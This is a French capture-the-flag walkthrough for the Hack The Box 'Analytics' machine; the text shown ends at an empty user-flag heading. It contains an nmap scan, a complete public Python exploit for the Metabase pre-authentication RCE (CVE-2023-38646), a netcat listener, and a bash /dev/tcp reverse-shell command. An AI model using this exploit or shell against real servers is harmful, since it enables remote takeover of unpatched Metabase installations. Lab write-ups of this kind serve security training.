
# Analytics - Easy


### Objectif : 
    Se connecter à la machine et trouver les flags de user.txt et root.txt

### Information :

Addresse IP : **10.10.11.233**

### Process : 

##### Récolte d'information : 

###### Scan du réseau : 


```
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.10.11.233 -sC -sV -F
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-11 04:47 EST
Nmap scan report for 10.10.11.233
Host is up (0.11s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.69 seconds

┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts                                                            
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.233  analytical.htb
```


###### Script python
En tapant Metabase rce sur google, on tombe sur 
- https://github.com/m3m0o/metabase-pre-auth-rce-poc/blob/main/main.py

```python
from argparse import ArgumentParser
from string import ascii_uppercase

import base64
import random
import requests


def encode_command_to_b64(payload: str) -> str:
    encoded_payload = base64.b64encode(payload.encode('ascii')).decode()
    equals_count = encoded_payload.count('=')

    if equals_count >= 1:
        encoded_payload = base64.b64encode(f'{payload + " " * equals_count}'.encode('ascii')).decode()

    return encoded_payload


parser = ArgumentParser('Metabase Pre-Auth RCE Reverse Shell', 'This script causes a server running Metabase (< 0.46.6.1 for open-source edition and < 1.46.6.1 for enterprise edition) to execute a command through the security flaw described in CVE 2023-38646')

parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
parser.add_argument('-t', '--token', type=str, required=True, help='Setup Token from /api/session/properties')
parser.add_argument('-c', '--command', type=str, required=True, help='Command to be execute in the target host')

args = parser.parse_args()

print('[!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IF YOU ARE ISSUING AN COMMAND TO GET REVERSE SHELL [!]\n')

print('[+] Initialized script')

print('[+] Encoding command')

command = encode_command_to_b64(args.command)

url = f'{args.url}/api/setup/validate'

headers = {
    "Content-Type": "application/json",
    "Connection": "close"
}

payload = {
    "token": args.token,
    "details": {
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER {random_string} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x".format(random_string = ''.join(random.choice(ascii_uppercase) for i in range(12)), command=command),
            "advanced-options": False,
            "ssl": True
        },
        "name": "x",
        "engine": "h2"
    }
}

print('[+] Making request')

request = requests.post(url, json=payload, headers=headers)

print('[+] Payload sent')
```

###### Exploit
- Lancer un listenner sur sa machine
```
nc -nlvp <Port>
```
- Lancer le script
```bash
python3 main.py -u http://data.analytical.htb -t <token> -c "bash -i >&/dev/tcp/<IP>/<PORT> 0>&1"
```
```
TOKEN = 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
```

###### User flag

